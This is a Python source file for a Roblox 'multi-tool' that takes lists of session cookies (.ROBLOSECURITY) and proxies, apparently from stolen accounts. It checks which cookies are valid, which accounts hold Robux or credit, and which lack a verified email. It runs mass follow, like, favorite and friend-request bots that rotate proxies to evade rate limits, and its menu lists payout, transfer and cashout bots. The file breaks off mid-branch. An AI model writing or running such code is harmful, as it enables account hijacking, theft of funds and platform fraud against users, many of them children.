#developed by jaix#2020

#start
import time, ctypes, threading, random, traceback, sys, datetime, json, os, subprocess
from threading import Thread
try:
    import requests
except:
    print("Please run RUN_THIS_FIRST.py before using this")
    time.sleep(20)
    sys.exit()


try:
    from colorama import Fore, init, Back, Style
    init(convert=True)
except:
    print("Please run RUN_THIS_FIRST.py before using this")
    time.sleep(20)
    sys.exit()

lock = threading.Lock()





print("""
░░▀ █▀▀█ ░▀░ █░█   ▀█░█▀ █▀█
░░█ █▄▄█ ▀█▀ ▄▀▄   ░█▄█░ ░▄▀
█▄█ ▀░░▀ ▀▀▀ ▀░▀   ░░▀░░ █▄▄""")

print("\n[jaix] ==> A program developed by jaix#2020")
time.sleep(1)
print("[jaix] ==> Ensure you have proxies placed in proxies.txt and cookies in cookies.txt. Ignore this message if you already have done this!")



time.sleep(1)
req = requests.Session()

#formatting
try:
    format = int(input("\n[jaix] ==> Cookie format:\n\n[1] user:pass:cookie\n[2] cookie\n"))
except:
    print(Fore.RED + "[jaix] ==> You did not enter a valid option -- exitting program")
cookies = open('cookies.txt','r').read().splitlines()
if format == 1:
    try:
        cookies = [cookie.split(':',2)[2] for cookie in cookies]
    except:
        print("\n[jaix] ==> Your cookies are not formatted like this or there were no cookies found in cookies.txt, please restart the program")
        time.sleep(20)
        sys.exit()
elif format == 2:
    cookies = ['_|'+line.split('_|')[-1] for line in cookies]
else:
    print("Not a valid option, exiting program")
    time.sleep(20)
    sys.exit()



proxies = open('proxies.txt','r').read().splitlines()
proxies = [{'https':'http://'+proxy} for proxy in proxies]



if len(proxies) == 0:
    print(Fore.RED + "[jaix] ==> WARNING - You have no proxies loaded - certain tools may not function as intended\n")

if len(cookies) == 0:
    print(Fore.RED + "\n[jaix] ==> WARNING - You have no cookies loaded - certain tools may not function as intended\n")

#functions

def duplicate_cookie_checker():
    global cookies, dupes
    checked = []
    count = 0
    r = open("output.txt","a+")
    for cookie in cookies:
        if cookie in checked:
            with lock:
                print("[jaix] ==> Found Duped Cookie - Removing Cookie")
            dupes+=1
        else:
            checked.append(cookie)
            r.write(f"{cookie}\n")

        count += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f"Checked {count}/{len(cookies)} cookies | Dupes Found: {dupes}")



def duplicate_combo_checker():
    global combos, dupes
    open("output.txt","w+").close()
    checked = []
    count = 0
    r = open("output.txt","a+")
    combos = open("combos.txt","r").read().splitlines()
    for combo in combos:
        if combo in checked:
            with lock:
                print("[jaix] ==> Found Duped Combo - Removing Combo")
            dupes+=1
        else:
            checked.append(combo)
            r.write(f"{combo}\n")
        count+=1
        ctypes.windll.kernel32.SetConsoleTitleW(f"Checked {count}/{len(combos)} combos | Dupes Found: {dupes}")


def follow(i):
    global cookies, proxies, followers, userid, cookiec
    cookiec += 1
    ctypes.windll.kernel32.SetConsoleTitleW(f"Followers botted: 0")
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
        r = req.post('https://auth.roblox.com/v2/login',proxies=random.choice(proxies))
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        return True
    while True:
        try:
            r = req.post(f'https://friends.roblox.com/v1/users/{userid}/follow',proxies=random.choice(proxies))
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy Error - Retrying - You may potentially be using bad proxies")
            continue
        try:
            if r.json()['errors'][0]['message'] == "TooManyRequests":
                with lock:
                    print(Fore.RED + "[jaix] ==> Proxy Ratelimited - Retrying with cookie")
        except:
            followers +=1
            ctypes.windll.kernel32.SetConsoleTitleW(f"Cookie Progress: {cookiec} | Botted: {followers} followers")
            with lock:
                print(Fore.GREEN + f"[jaix] ==> Received Follower {followers}")
            break

    return True


def unfollow(i):
    global cookies, proxies, followers, userid, cookiec
    cookiec += 1
    ctypes.windll.kernel32.SetConsoleTitleW(f"Un-followers botted: 0")
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
        r = req.post('https://auth.roblox.com/v2/login')
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        return True
    while True:
        try:
            r = req.post(f'https://friends.roblox.com/v1/users/{userid}/unfollow',proxies=random.choice(proxies))
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy Error - Retrying - You may potentially be using bad proxies")
            continue

        try:
            if r.json()['errors'][0]['message'] == "TooManyRequests":
                with lock:
                    print(Fore.RED + "[jaix] ==> Proxy Ratelimited - Retrying with cookie")
                continue
        except:
            if r.status_code == 200:
                with lock:
                    print(Fore.GREEN + "[jaix] ==> User has been unfollowed")
                followers +=1
                ctypes.windll.kernel32.SetConsoleTitleW(f"Cookie Progress: {cookiec} | Botted: {followers} un-followers")
                break
            else:
                with lock:
                    print(Fore.RED + "[jaix] ==> Unexpected issue occurred, skipping cookie...")
                ctypes.windll.kernel32.SetConsoleTitleW(f"Cookie Progress: {cookiec} | Botted: {followers} un-followers")
                break

    return True


def robux_check(i):
    global robux, minimum, checked, working, proxies
    checked += 1
    robux_cookies = []
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    while True:
        #ctypes.windll.kernel32.SetConsoleTitleW(f"Robux: {robux} | Cookies Checked: {checked}/{len(cookies)} | Working Cookies: {working}")
        try:
            r = req.get("https://api.roblox.com/currency/balance")
            working += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f"Robux: {robux} | Cookies Checked: {checked}/{len(cookies)} | Working Cookies: {working}")
        except:
            try:
                if r.json()['errors'][0]['message'] == "Forbidden":
                    with lock:
                        print(Fore.RED + "[jaix] ==> Invalid cookie found -- Skipping")
                    return True
            except:
                with lock:
                    print(Fore.RED + "[jaix] Proxy Error - Retrying - You may potentially be using bad proxies")
                continue
        robux_balance = r.json()['robux']
        if robux_balance >= minimum:
            robux += robux_balance
            f = open("output.txt","a+")
            f.write(f"{robux_balance}:{i}\n")
            with lock:
                print(Fore.GREEN + f"[jaix] ==> Cookie found with {robux_balance} robux")
            ctypes.windll.kernel32.SetConsoleTitleW(f"Robux: {robux} | Cookies Checked: {checked}/{len(cookies)} | Working Cookies: {working}")
            break
    return True


def cookie_check(i):
    global valid, invalid, checked, lock
    req = requests.Session()
    checked += 1
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('https://www.roblox.com/mobileapi/userinfo')
        if 'mobileapi/user' in r.url:
            f = open("output.txt","a+")
            f.write(f"{i}\n")
            valid += 1
            with lock:
                print(Fore.GREEN + "[jaix] ==> Valid Cookie Found")
        else:
            invalid += 1
            with lock:
                print(Fore.RED + "[jaix] ==> Invalid Cookie Found")
            return True
        ctypes.windll.kernel32.SetConsoleTitleW(f"Valid Cookies: {valid} | Invalid Cookies: {invalid} | Cookies Checked: {checked}/{len(cookies)}")
    except:
        cookies.append(i)
        ctypes.windll.kernel32.SetConsoleTitleW(f"Valid Cookies: {valid} | Invalid Cookies: {invalid} | Cookies Checked: {checked}/{len(cookies)}")



def premium_check(i):
    global premium, checked, lock
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get("https://www.roblox.com/mobileapi/userinfo")
        if "mobileapi/user" not in r.url:
            checked +=1
            with lock:
                print(Fore.RED + "[jaix] ==> Invalid Cookie")
            return True
        r = req.get('https://api.roblox.com/users/account-info').json()
        premium = r['MembershipType']
        if premium != 0:
            with lock:
                print(Fore.GREEN + "[jaix] ==> Premium cookie found")
            premium += 1
        else:
            with lock:
                print(Fore.RED + "[jaix] ==> Cookie does not have premium")
        checked+=1
    except:
        cookies.append(i)
    ctypes.windll.kernel32.SetConsoleTitleW(f"Premium cookies: {premium} | Cookies Checked: {checked}/{len(cookies)}")
    return True

def favorite(i):
    global checked, favorites, assetid, lock, errors, proxies
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    checked += 1

    ctypes.windll.kernel32.SetConsoleTitleW(f"Favorited: {favorites} favorites | Checked through {checked}/{len(cookies)} cookies")
    while True:
        try:
            r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
            r = req.post('https://auth.roblox.com/v2/login',proxies=random.choice(proxies))
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy Error or Invalid Cookie -- Skipping")
            errors += 1
            return True
        try:
            data ={
            "itemTargetId":assetid,
            "favoriteType": "asset"
            }
            r = req.post("https://web.roblox.com/v2/favorite/toggle",data=data,proxies=random.choice(proxies))
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy Error - Retrying - You may potentially be using bad proxies")
            continue
        try:
            if r.json()['success'] == True:
                with lock:
                    print(Fore.GREEN + f"[jaix] ==> Favorited {assetid}")
                favorites += 1
                return True
        except:
            if r.json()['success'] == False and r.json()['message'] == "Too Many Attempts":
                with lock:
                    print(Fore.RED + "[jaix] ==> Proxy Ratelimited -- Retrying")
                continue
            else:
                break
    ctypes.windll.kernel32.SetConsoleTitleW(f"Favorited: {favorites} favorites | Checked through {checked}/{len(cookies)} cookies")
    return True

def notify(sale):
    global groupid, cookie, webhook
    content = {
        "embeds": [{
            "color": 65280,
            "title": f"New Sale - R$ {sale['currency']['amount']}",
            "thumbnail" : {
                "url" : requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={sale["agent"]["id"]}&size=150x150&format=png').json()['data'][0]['imageUrl']
            },
            "fields" : [
                {
                    "name": "User:",
                    "value": sale['agent']['name'],
                    "inline": False
                },
                {
                    "name": "Asset:",
                    "value": sale['details']['name'],
                    "inline": False
                }
            ],
            "timestamp": str(datetime.datetime.now().astimezone())
        }]
    }
    print('New Sale:',sale['agent']['name'],'bought',sale['details']['name'],'for',sale['currency']['amount'])
    r = requests.post(webhook,json=content)



def credit_check(i):
    global minimum, checked, lock, total
    checked += 1
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
        bal = req.get('https://billing.roblox.com/v1/credit').json()['balance']
        if bal == 0.00:
            with lock:
                print(Fore.RED + "[jaix] ==> Cookie has $0.00 credit -- skipping")
        elif bal >= minimum:
            total += bal
            with lock:
                print(Fore.GREEN + f"[jaix] ==> Cookie found with ${bal} credit")
            f = open("output.txt","a+")
            f.write(f"{bal}:{i}\n")
    except:
        with lock:
            print(Fore.RED + "[jaix] ==> Invalid Cookie -- Skipping")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Credit: ${total} | Cookies Checked: {checked}/{len(cookies)}")
    return True


def find():
    global checked, valid, lock, minimum, maximum, threadc
    while True:
        groupid = random.randint(minimum,maximum)
        try:
            r = requests.get(f'https://groups.roblox.com/v1/groups/{groupid}',proxies=random.choice(proxies)).json()
            if ('errors' not in r) and (r['owner'] == None) and (r['publicEntryAllowed'] == True) and ('isLocked' not in r) and (r['isBuildersClubOnly'] == False):
                valid += 1
                f = open("output.txt","a+")
                f.write(f'https://www.roblox.com/groups/{groupid}\n')
                with lock:
                    print(Fore.GREEN + f"[jaix] ==> Found unclaimed group | GroupID: {groupid}")
            else:
                try:
                    if r['errors'][0]['message'] == "TooManyRequests":
                        with lock:
                            print(Fore.RED + "[jaix] ==> Ratelimited | Retrying")
                        continue
                except: pass

            checked += 1

        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy error - You may potentially be using bad proxies")

def age_check(i):
    global checked, lock
    checked += 1
    ctypes.windll.kernel32.SetConsoleTitleW(f'Cookie Age Checker | Checked {checked}/{len(cookies)}')
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    r = req.get("https://users.roblox.com/v1/users/authenticated").json()
    try:
        if r['errors'][0]['message'] == "Authorization has been denied for this request.":
            with lock:
                print(Fore.RED + "[jaix] ==> Invalid Cookie -- Skipping")
            return True
    except:
        userid = r['id']
    created = req.get(f"https://users.roblox.com/v1/users/{userid}").json()['created']
    f = open("output.txt","a+")
    f.write(f"{created}:{i}")
    with lock:
        print(Fore.GREEN + f"Cookie Creation Date Found: {created}")
    return True

def visit():
    global cookies, gameid, lock
    while cookies:
        try:
            c = requests.Session()
            cookie = cookies.pop()
            c.cookies['.ROBLOSECURITY'] = cookie
            xsrf = c.post(
                  url="https://auth.roblox.com/v1/authentication-ticket/",
                  headers={"User-Agent": "Roblox/WinInet", "Referer": "https://www.roblox.com/develop", "RBX-For-Gameauth": "true"},
                  allow_redirects=False
                ).headers['X-CSRF-TOKEN']
            authcode = c.post(
                  url="https://auth.roblox.com/v1/authentication-ticket/",
                  headers={"User-Agent": "Roblox/WinInet", "Referer": "https://www.roblox.com/develop", "RBX-For-Gameauth": "true","X-CSRF-TOKEN":xsrf},
                  allow_redirects=False
                ).headers['rbx-authentication-ticket']
            browserTrackerId = int("55393295400")+random.randint(1,100)
            launchTime = int(time.time()*1000)
            url = f"roblox-player:1+launchmode:play+gameinfo:{authcode}+launchtime:{launchTime}+placelauncherurl:https://assetgame.roblox.com/game/PlaceLauncher.ashx?request=RequestGame&browserTrackerId={browserTrackerId}&placeId={gameid}&isPlayTogetherGame=false+browsertrackerid:{browserTrackerId}+robloxLocale:en_us+gameLocale:en_us"
            os.startfile(url)
            time.sleep(25)
            os.system('taskkill /f /im RobloxPlayerBeta.exe')
            cookies.append(cookie)
        except Exception as e:
            with lock:
                print(Fore.RED + "[jaix] ==> Invalid cookie -- skipping")
            pass


def game_like(i):
    global lock, checked, liked, proxies
    req = requests.Session()
    checked += 1
    req.cookies['.ROBLOSECURITY'] = i
    ctypes.windll.kernel32.SetConsoleTitleW(f'Liked: {liked} | Progress: {checked}/{len(cookies)}')
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
        r = req.post('https://auth.roblox.com/v2/login',proxies=random.choice(proxies))
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        with lock:
            print(Fore.RED + "[jaix] ==> Invalid Cookie/Proxy Error -- Skipping")
        return True
    while True:
        try:
            r = req.post(f"https://www.roblox.com/voting/vote?assetId={game_id}&vote=true",proxies=random.choice(proxies))
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy Error - Retrying - You may potentially be using bad proxies")
            continue

    if 'Success' in r.json():
        if r.json()['Success'] == True:
            with lock:
                print(Fore.GREEN + "[jaix] ==> Successfully liked game")
            liked += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'Liked: {liked} | Progress: {checked}/{len(cookies)}')
        elif r.json()['Success'] == False:
            if r.json()['ModalType'] == "PlayGame":
                with lock:
                    print(Fore.RED + "[jaix] ==> Game must be played before being able to like -- Skipping")
    else:
        with lock:
            print(Fore.RED + f"[jaix] ==> Unknown Error: {r.json()}")
    return True

def verified_check(i):
    global checked, verified, unverified, lock
    checked += 1
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    r = req.get("https://api.roblox.com/users/account-info/")
    try:
        if r.json()['errors'][0]['message'] == "Unauthorized":
            with lock:
                print(Fore.RED + "[jaix] ==> Invalid Cookie -- Skipping")
            return True
    except:
        if r.json()['Email'] == None:
            with open("output.txt","a+") as f:
                f.write(f"{i}\n")
                with lock:
                    print(Fore.GREEN + "[jaix] ==> Unverified Cookie Found -- Cookie found and written to output.txt")
                unverified += 1
        else:
            verifiedc = r.json()['Email']['IsVerified']
            if verifiedc == True:
                verified += 1
                with lock:
                    print(Fore.RED + "[jaix] ==> Verified Cookie Found -- Cookie was found but it is verified")
            elif verifiedc == False:
                with lock:
                    print(Fore.GREEN + f"[jaix] ==> Cookie has emailed linked but is pending verified -- {r.json()['Email']}")
                unverified += 1
                with open("output.txt","a+") as f:
                    f.write(f"{i}\n")


    ctypes.windll.kernel32.SetConsoleTitleW(f'Unverified: {unverified} | Verified: {verified} | Progress: {checked}/{len(cookies)}')
    return True


def invalidate(i):
    global checked, lock, killed
    checked += 1
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    ctypes.windll.kernel32.SetConsoleTitleW(f'Invalidated: {killed} | Progress: {checked}/{len(cookies)}')
    while True:
        try:
            r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
            r = req.post('https://auth.roblox.com/v2/login',proxies=random.choice(proxies))
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        except:
            with lock:
                print(Fore.RED +"[jaix] ==> Cookie error or proxy error -- skipping")
            ctypes.windll.kernel32.SetConsoleTitleW(f'Invalidated: {killed} | Progress: {checked}/{len(cookies)}')
            return True
        try:
            r = req.post("https://auth.roblox.com/v2/logout",proxies=random.choice(proxies))
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy Error - Retrying - You may potentially be using bad proxies")
            continue
        if 'errors' in r.json():
            if r.json()['errors'][0]['message'] == "Authorization has been denied for this request.":
                with lock:
                    print(Fore.RED + "[jaix] ==> Invalid Cookie -- Skipping")
                ctypes.windll.kernel32.SetConsoleTitleW(f'Invalidated: {killed} | Progress: {checked}/{len(cookies)}')
                return True
            elif r.json()['errors'][0]['message'] == "Token Validation Failed":
                with lock:
                    print(Fore.RED + "[jaix] ==> Unable to grab token -- retrying")
                continue
        else:
            if r.json() == "{}":
                with lock:
                    print(Fore.GREEN + "[jaix] ==> Successfully invalidated cookie")
                break
                killed += 1
            else:
                with lock:
                    print(Fore.RED + f"[jaix] ==> Unknown error occurred -- {r.json()}")
                break
    return True


def status_change(i):
    global changed, checked, lock, status, proxies
    req = requests.Session()
    checked += 1
    ctypes.windll.kernel32.SetConsoleTitleW(f'Changed Status: {changed} | Progress: {checked}/{len(cookies)}')
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
        r = req.post('https://auth.roblox.com/v2/login',proxies=random.choice(proxies))
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        with lock:
            print(Fore.RED + "[jaix] ==> Proxy Error or Invalid Cookie -- Skipping")
        return True
    data = {
    "status":status,
    "sendToFaceBook":False
    }
    while True:
        r = req.post("https://www.roblox.com/home/updatestatus",data=data,proxies=random.choice(proxies))
        if 'success' in r.json():
            if r.json()['success'] == True:
                with lock:
                    print(Fore.GREEN + "[jaix] ==> Successfully updated status")
                changed += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f'Changed Status: {changed} | Progress: {checked}/{len(cookies)}')
                return True
            elif r.json()['success'] == False and r.json()['message'] == "Too many updates. Please try again later.":
                with lock:
                    print(Fore.RED + "[jaix] ==> Ratelimited -- retrying")
                continue
        else:
            with lock:
                print(Fore.RED + f"[jaix] ==> Unknown error occurred -- error message: {r.json()}")
            return True
    ctypes.windll.kernel32.SetConsoleTitleW(f'Changed Status: {changed} | Progress: {checked}/{len(cookies)}')
    return True


def game_dislike(i):
    global lock, checked, disliked, proxies
    req = requests.Session()
    checked += 1
    req.cookies['.ROBLOSECURITY'] = i
    ctypes.windll.kernel32.SetConsoleTitleW(f'Disiked: {liked} | Progress: {checked}/{len(cookies)}')
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
        r = req.post('https://auth.roblox.com/v2/login',proxies=random.choice(proxies))
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        with lock:
            print(Fore.RED + "[jaix] ==> Invalid Cookie/Proxy Error -- Skipping")
        return True
    while True:
        try:
            r = req.post(f"https://www.roblox.com/voting/vote?assetId={game_id}&vote=false",proxies=random.choice(proxies))
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy Error - Retrying - You may potentially be using bad proxies")
            continue

    if 'Success' in r.json():
        if r.json()['Success'] == True:
            with lock:
                print(Fore.GREEN + "[jaix] ==> Successfully disliked game")
            disliked += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'Disliked: {liked} | Progress: {checked}/{len(cookies)}')
        elif r.json()['Success'] == False:
            if r.json()['ModalType'] == "PlayGame":
                with lock:
                    print(Fore.RED + "[jaix] ==> Game must be played before being able to dislike -- Skipping")
    else:
        with lock:
            print(Fore.RED + f"[jaix] ==> Unknown Error: {r.json()}")
    return True

def friend_request(i):
    global lock, checked, sent, id, proxies
    checked += 1
    ctypes.windll.kernel32.SetConsoleTitleW(f'Sent requests: {sent} | Progress: {checked}/{len(cookies)}')
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
        r = req.post('https://auth.roblox.com/v2/login',proxies=random.choice(proxies))
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        with lock:
            print(Fore.RED + "[jaix] ==> You entered an invalid cookie or a proxy error occurred -- skipping")
        return True
    while True:
        try:
            r = req.post(f"https://friends.roblox.com/v1/users/{id}/request-friendship",proxies=random.choice(proxies))
        except:
            with lock:
                print(Fore.RED + "[jaix] ==> Proxy Error - Retrying - You may potentially be using bad proxies")
            continue
        if 'success' in r.json():
            if r.json()['success'] == True:
                with lock:
                    print(Fore.GREEN + f"[jaix] ==> Successfully sent friend request to {id}")
                sent += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f'Sent requests: {sent} | Progress: {checked}/{len(cookies)}')
                break
        elif 'errors' in r.json():
            if r.json()['errors'][0]['message'] == "The target user is already a friend.":
                with lock:
                    print(Fore.RED + "[jaix] ==> Failed to send friend request -- friend request is already pending")
                break
    ctypes.windll.kernel32.SetConsoleTitleW(f'Sent requests: {sent} | Progress: {checked}/{len(cookies)}')
    return True



time.sleep(1)
print(Fore.CYAN + "\n[jaix] ==> Cyan does require proxies")
print(Fore.MAGENTA + "[jaix] ==> Pink does not require proxies\n\n")
time.sleep(1)

print(Fore.MAGENTA + "[1] -> Duplicate Cookie/Combo Remover")
print(Fore.CYAN + "[2] -> Mass Follow Bot")
print(Fore.CYAN + "[3] -> Mass Unfollow Bot")
print(Fore.MAGENTA + "[4] -> Robux Checker")
print(Fore.MAGENTA + "[5] -> Cookie Checker")
print(Fore.MAGENTA + "[6] -> Premium Checker")
print(Fore.CYAN + "[7] -> Favorite Bot")
print(Fore.MAGENTA + "[8] -> Clothing Sale Notifier")
print(Fore.MAGENTA + "[9] -> Credit Checker")
print(Fore.CYAN + "[10] -> Group Checker/Scraper")
print(Fore.MAGENTA + "[11] -> Age Checker")
print(Fore.MAGENTA + "[12] -> Payout Bot")
print(Fore.MAGENTA + "[13] -> User:Pass:Cookie to Cookie Converter")
print(Fore.MAGENTA + "[14] -> Visit Bot")
print(Fore.CYAN + "[15] -> Like Bot")
print(Fore.MAGENTA + "[16] -> Verified Cookie Checker")
print(Fore.CYAN + "[17] -> Cookie Killed/Invalidator")
print(Fore.CYAN + "[18] -> Robux Transfer Bot")
print(Fore.CYAN + "[19] -> Mass Status Changer")
print(Fore.CYAN + "[20] -> Cashout Bot")
print(Fore.CYAN + "[21] -> Mass Dislike Bot")
print(Fore.MAGENTA + "[22] -> Proxy Checker")
print(Fore.CYAN + "[23] -> Mass Friend Request Bot")
print(Fore.MAGENTA + "[24] -> Rap Scraper/Checker")
print(Fore.MAGENTA + "[25] -> Group Payout Detector")


try:
    option = int(input("\n[jaix] ==> Enter number of tool that you'd like to use: "))
except:
    print(Fore.RED + "[jaix] ==> You did not enter a valid option -- exitting program")
    time.sleep(30)
    sys.exit()



open('output.txt', 'w+').close()
if option == 1:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    dupes = 0
    type = int(input("\n[1] Combos\n[2] Cookies\nEnter option of what you're checking for dupes: "))
    if type == 1:
        print("[jaix] ==> Ensure you have your combos loaded in the format user:pass in combos.txt")
    elif type == 2:
        print("[jaix] ==> Ensure you have your cookies loaded in the cookies.txt file")
    print("[jaix] ==> Checking is beginning...")
    if type == 2:
        duplicate_cookie_checker()
        print(Fore.GREEN + "[jaix] ==> Version with non dupes can be found in output.txt")
    elif type == 1:
        duplicate_combo_checker()
        print(Fore.GREEN + "[jaix] ==> Version with non dupes can be found in output.txt")
elif option == 2:
    print("\n[jaix] ==> Note that this option does need proxies and will not work as intended if proxies aren't used")
    userid = int(input("Enter userid of the profile you are botting followers: "))
    followers = 0
    cookiec = 0
    r = req.get(f"https://api.roblox.com/users/{userid}")
    try:
        if r.json()['errors'][0]['message'] == "BadRequest":
            print("[jaix] ==> Invalid UserID - Exitting Program")
            time.sleep(30)
            sys.exit()
    except:
        pass
    print("[jaix] ==> UserID Found on ROBLOX")
    time.sleep(1)
    print("[jaix] ==> All invalid cookies will be skipped")
    print("[jaix] ==> Beginning Following Botting...")
    ts = []
    for i in cookies:
        t = threading.Thread(target=follow,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print(Fore.GREEN + f"[jaix] ==> Completed Following Botting | Received {followers} followers")
elif option == 3:
    print("\n[jaix] ==> Note that this option does need proxies and will not work as intended if proxies aren't used")
    userid = int(input("Enter userid of the profile you are botting un-followers: "))
    followers = 0
    cookiec = 0
    r = req.get(f"https://api.roblox.com/users/{userid}")
    try:
        if r.json()['errors'][0]['message'] == "BadRequest":
            print("[jaix] ==> Invalid UserID - Exitting Program")
            time.sleep(30)
            sys.exit()
    except:
        pass
    print("[jaix] ==> UserID Found on ROBLOX")
    time.sleep(1)
    print("[jaix] ==> All invalid cookies will be skipped")
    print("[jaix] ==> Beginning Un-following Botting...")
    ts = []
    for i in cookies:
        t = threading.Thread(target=unfollow,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print(Fore.GREEN + f"[jaix] ==> Completed Un-following Botting | Removed {followers} followers")
elif option == 4:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    checked = 0
    working = 0
    robux = 0
    ctypes.windll.kernel32.SetConsoleTitleW(f"Robux: {robux} | Cookies Checked: {checked}/{len(cookies)} | Working Cookies: {working}")
    minimum = int(input("[jaix] ==> Enter minimum of robux to find: "))
    print("[jaix] All cookies that have robux above the minimum set will be written to output.txt in format: robux:cookie")
    ts = []
    for i in cookies:
        t = threading.Thread(target=robux_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if robux == 0:
        print(Fore.RED + "[jaix] ==> No robux was found in the cookies above the minimum you set")
    print(Fore.GREEN + "[jaix] ==> All cookies have been checked and written to output.txt")
elif option == 5:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    invalid = 0
    valid = 0
    checked = 0
    print("[jaix] ==> Beginning checks for valid cookies")
    ts = []
    for i in cookies:
        t = threading.Thread(target=cookie_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if valid == 0:
        print(Fore.RED + "[jaix] ==> No valid cookies were found")
    print(Fore.GREEN + "[jaix] ==> All cookies have been checked and the working ones have been written to output.txt")
elif option == 6:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    checked = 0
    premium = 0
    ctypes.windll.kernel32.SetConsoleTitleW(f"Premium Cookies: {premium} | Checked: {checked}/{len(cookies)}")
    print("[jaix] ==> Beginning checks for premium cookies")
    ts = []
    for i in cookies:
        t = threading.Thread(target=premium_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    if premium == 0:
        print(Fore.RED + "[jaix] ==> No premium cookies were found")
    print(Fore.GREEN + f"[jaix] ==> Successfully checked for premium cookies | {premium} premium cookies found")
elif option == 7:
    print("\n[jaix] ==> Note that this option does need proxies and will not work as intended if proxies aren't used")
    assetid = int(input("[jaix] ==> Enter game/asset ID to favorite bot: "))
    req = requests.Session()
    r = req.get(f"https://catalog.roblox.com/v1/favorites/assets/{assetid}/count")
    try:
        if r.json()['errors'][0]['message'] == "Invalid asset Id.":
            print(Fore.RED + "[jaix] ==> Invalid asset id entered -- Exiting program...")
            times.sleep(30)
            sys.exit()
    except:
        print(Fore.GREEN + f"[jaix] ==> AssetID Found: {assetid}")
    checked = 0
    favorites = 0
    errors = 0
    ts = []
    for i in cookies:
        t = threading.Thread(target=favorite,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print(Fore.GREEN + "[jaix] ==> Favorite Botting Complete")
    time.sleep(1)
    if errors == len(cookies):
        print(Fore.RED + "[jaix] ==> Use the cookie checker to get the valid cookies, if you still get the error after using validated cookies it is because of a proxy error (you're using bad proxies)")
    if favorites == 0:
        print(Fore.RED + f"[jaix] ==> No favorites were botted to {assetid}")
    elif favorites > 0:
        print(Fore.GREEN + f"[jaix] ==> {favorites} favorites were given to asset/game: {assetid}")
elif option == 8:
    print("\n[jaix] ==> Note that this option doesn't need proxies")
    try:
        cookie = open("cookie.txt","r").read().splitlines()[0]
    except:
        print(Fore.RED + "[jaix] ==> No cookie found in cookie.txt -- Exitting program")
        time.sleep(30)
        sys.exit()
    if len(cookie) == 0:
        print(Fore.RED + "[jaix] ==> Ensure your main cookie is in cookie.txt -- restart program")
        time.sleep(30)
        sys.exit()
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = cookie
    r = req.get('https://www.roblox.com/mobileapi/userinfo')
    if 'mobileapi/user' in r.url:
        print(Fore.GREEN + "[jaix] ==> Valid Cookie Found")
        username = r.json()['UserName']
    else:
        print(Fore.RED + "[jaix] ==> Invalid Cookie -- Exiting Program")
        time.sleep(30)
        sys.exit()
    print(Fore.GREEN + "[jaix] ==> Logged into cookie")
    print("[jaix] ==> Note that entering the wrong webhook link will not notify you of sales")
    webhook = str(input("Enter webhhook link: "))
    groupid = int(input("Enter groupID: "))
    r = req.get(f"https://groups.roblox.com/v1/groups/{groupid}")
    try:
        if r.json()['errors'][0]['message'] == "Group is invalid or does not exist.":
            print(Fore.RED + "[jaix] ==> Invalid Group ID provided -- Exitting program")
            time.sleep(30)
            sys.exit()
